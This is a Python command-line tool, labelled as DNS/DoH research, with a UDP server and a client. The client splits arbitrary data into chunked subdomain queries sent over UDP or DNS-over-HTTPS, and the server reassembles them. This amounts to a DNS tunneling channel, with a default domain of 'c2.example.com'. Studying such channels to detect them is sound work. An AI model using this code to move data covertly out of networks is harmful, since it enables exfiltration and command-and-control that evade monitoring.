# language: Python, file: cli.py, runtime: Python 3.10+
import argparse
import socket
import sys

from DNS_Research import dns_query, send_udp, send_doh, parse_minimal_response, encode
from receiver import build_response, parse_qname, decode


def run_server(port: int, domain: str, response_type: str, message: str):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", port))
    print(f"[*] DoH/DNS Research Server escutando em 0.0.0.0:{port}")
    print(f"[*] Domínio base monitorado: {domain}")
    print(f"[*] Modo de resposta configurado: {response_type} ({message})\n")

    sessions = {}

    while True:
        data, addr = sock.recvfrom(512)
        if len(data) < 12:
            continue

        qname, question_end = parse_qname(data, 12)

        if qname.endswith(domain):
            prefix = qname[:-len(domain) - 1]
            parts = prefix.split(".")

            if len(parts) >= 4:
                session_id = parts[0]
                seq = int(parts[1])
                total = int(parts[2])
                chunk = parts[3]

                if session_id not in sessions:
                    sessions[session_id] = {"total": total, "chunks": {}}

                sessions[session_id]["chunks"][seq] = chunk
                print(f"[>] [{session_id}] Chunk {seq + 1}/{total} recebido de {addr[0]}:{addr[1]}")

                sessao = sessions[session_id]
                if len(sessao["chunks"]) == sessao["total"]:
                    fqdns_ordered = [
                        f"{session_id}.{i}.{sessao['total']}.{sessao['chunks'][i]}.{domain}"
                        for i in sorted(sessao["chunks"].keys())
                    ]
                    payload = decode(fqdns_ordered, domain)
                    print(f"\n[+] ===========================================")
                    print(f"[+] SESSÃO {session_id} COMPLETA!")
                    print(f"[+] Payload: {payload}")
                    print(f"[+] ===========================================\n")
                    del sessions[session_id]

        response = build_response(data, question_end, response_type=response_type, MSG=message)
        sock.sendto(response, addr)


def run_client(domain: str, data_str: str, server: str, port: int, transport: str, qtype: str):
    data_bytes = data_str.encode("utf-8")
    fqdns = encode(data_bytes, domain)
    total_chunks = len(fqdns)

    print(f"[*] Iniciando transmissão ({len(data_bytes)} bytes)")
    print(f"[*] Total de chunks gerados: {total_chunks}")
    print(f"[*] Transporte: {transport.upper()} | Servidor alvo: {server}:{port}\n")

    for idx, fqdn in enumerate(fqdns, 1):
        print(f"[>] Enviando chunk {idx}/{total_chunks}: {fqdn}")
        packet = dns_query(fqdn, qtype)

        if transport.lower() == "udp":
            response = send_udp(packet, server=server, port=port)
        elif transport.lower() == "doh":
            endpoint = f"https://{server}/dns-query" if not server.startswith("http") else server
            response = send_doh(packet, endpoint=endpoint)
        else:
            print(f"[-] Transporte inválido: {transport}")
            return

        result = parse_minimal_response(response)
        if result:
            if result["type"] == 1:
                ip_str = socket.inet_ntoa(result["rdata"])
                print(f"    [<] Resposta Tipo A: {ip_str} (TTL: {result['ttl']})")
            elif result["type"] == 16:
                txt_len = result["rdata"][0]
                txt_msg = result["rdata"][1:1 + txt_len].decode("ascii", errors="replace")
                print(f"    [<] Resposta Tipo TXT: {txt_msg}")

    print("\n[+] Transmissão finalizada com sucesso!")


def run_resolve(domain: str, qtype: str, transport: str, server: str, port: int):
    print(f"[*] Consultando '{domain}' (Tipo {qtype}) via {transport.upper()}...")
    packet = dns_query(domain, qtype)

    if transport.lower() == "udp":
        response = send_udp(packet, server=server, port=port)
    else:
        endpoint = f"https://{server}/dns-query" if not server.startswith("http") else server
        response = send_doh(packet, endpoint=endpoint)

    result = parse_minimal_response(response)
    if result:
        if result["type"] == 1:
            ip_str = socket.inet_ntoa(result["rdata"])
            print(f"[+] IPv4 Resolvido: {ip_str} (TTL: {result['ttl']})")
        elif result["type"] == 16:
            txt_len = result["rdata"][0]
            txt_msg = result["rdata"][1:1 + txt_len].decode("ascii", errors="replace")
            print(f"[+] TXT Resolvido: {txt_msg}")
        else:
            print(f"[+] Dados brutos (Tipo {result['type']}): {result['rdata']}")
    else:
        print("[-] Nenhuma resposta válida encontrada.")


def main():
    parser = argparse.ArgumentParser(
        description="doh-research CLI - Utilitário de análise e transporte DNS / DoH (RFC 1035 / RFC 8484)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    subparsers = parser.add_subparsers(dest="command", required=True)

    # Subcomando: server
    p_server = subparsers.add_parser("server", help="Inicia o servidor receptor DNS UDP local")
    p_server.add_argument("--port", type=int, default=8080, help="Porta de escuta UDP (padrão: 8080)")
    p_server.add_argument("--domain", type=str, default="c2.example.com", help="Apex domain a monitorar")
    p_server.add_argument("--type", choices=["TXT", "A"], default="TXT", help="Tipo de registro na resposta")
    p_server.add_argument("--msg", type=str, default="ACK", help="Mensagem retornada no registro TXT")

    # Subcomando: send (cliente de transmissão)
    p_client = subparsers.add_parser("send", help="Transmite dados fatiados em chunks via DNS/DoH")
    p_client.add_argument("--data", type=str, required=True, help="Texto ou payload para transmitir")
    p_client.add_argument("--domain", type=str, default="c2.example.com", help="Apex domain de destino")
    p_client.add_argument("--transport", choices=["udp", "doh"], default="udp", help="Protocolo de transporte")
    p_client.add_argument("--server", type=str, default="127.0.0.1", help="Servidor alvo (IP ou host DoH)")
    p_client.add_argument("--port", type=int, default=8080, help="Porta do servidor (para UDP)")
    p_client.add_argument("--qtype", type=str, default="TXT", help="Tipo da query (A, TXT, AAAA)")

    # Subcomando: query (resolução padrão de domínio)
    p_query = subparsers.add_parser("query", help="Resolve um domínio direto via DoH ou UDP")
    p_query.add_argument("domain", type=str, help="Domínio para consultar (ex: google.com)")
    p_query.add_argument("--type", type=str, default="A", help="Tipo de registro (A, TXT, AAAA)")
    p_query.add_argument("--transport", choices=["doh", "udp"], default="doh", help="Meio de transporte")
    p_query.add_argument("--server", type=str, default="cloudflare-dns.com", help="Servidor de resolução")
    p_query.add_argument("--port", type=int, default=53, help="Porta UDP (quando transport=udp)")

    args = parser.parse_args()

    if args.command == "server":
        run_server(args.port, args.domain, args.type, args.msg)
    elif args.command == "send":
        run_client(args.domain, args.data, args.server, args.port, args.transport, args.qtype)
    elif args.command == "query":
        run_resolve(args.domain, args.type, args.transport, args.server, args.port)


if __name__ == "__main__":
    main()
